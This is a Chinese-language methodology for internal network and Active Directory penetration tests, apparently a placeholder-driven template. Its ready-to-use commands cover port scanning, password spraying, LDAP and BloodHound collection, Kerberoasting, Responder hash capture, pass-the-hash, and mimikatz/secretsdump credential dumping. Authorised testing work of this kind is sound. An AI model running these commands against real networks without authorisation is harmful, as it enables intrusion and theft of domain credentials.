# 内网 / AD 渗透方法论（Network & Active Directory）

占位符约定：TARGET、PORT、WORDLIST、THREADS、RATE、SPRAY_TEMPLATE、PIVOT_SLOT、RESULT_LOG。

## 1. 主机与端口枚举
- `nmap -sV -sC -p- TARGET -oA RESULT_LOG/nmap`；重点服务：445(SMB)、22、3389、5985(WinRM)、389/636(LDAP)、88(Kerberos)、53。
- 存活主机：`nmap -sn 10.0.0.0/24`、`fping`、`arp-scan`。

## 2. 口令喷洒（限速）
- `crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Password1' --continue-on-success` 或 SPRAY_TEMPLATE 自定义脚本。
- 限速 RATE 防锁定（域策略阈值 5 次/30 分钟）；先探测 `net accounts` 锁定策略。

## 3. 域信息收集
- `ldapsearch -x -H ldap://DC -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName`。
- `adfind -h DC -u user -p pass -f "(objectCategory=user)"` 全量导出。
- BloodHound：`bloodhound-python -u user -p pass -d domain -c All` 采集域关系。

## 4. 漏洞利用
- 永恒之蓝类：MS17-010 / CVE-2020-1472（Zerologon，需确认目标版本）。
- Kerberos：AS-REP Roasting（`GetNPUsers.py`）、Kerberoasting（`GetUserSPNs.py`）、委派滥用。
- SMB：空会话枚举、SMBv1、pipe 探测。
- 中间人：Responder 抓 NTLMv2 hash → hashcat 爆破。

## 5. 横向与提权
- 哈希传递：`psexec.py -hashes LM:NT user@TARGET`。
- 令牌窃取：`secretsdump.py`、`mimikatz sekurlsa::logonpasswords`。
- 横向 PIVOT_SLOT：SSH 隧道 / socks 代理（chisel / frp）/ WinRM 隧道。

## 6. 全程记录
所有命令输出、凭据、路径写入 RESULT_LOG（JSONL），便于复现与清理。

## 输出
按 目标占位流程： 开头：端口枚举 → 口令喷洒（限速 RATE）→ 域信息收集 → 横向 PIVOT_SLOT → 记录 RESULT_LOG。
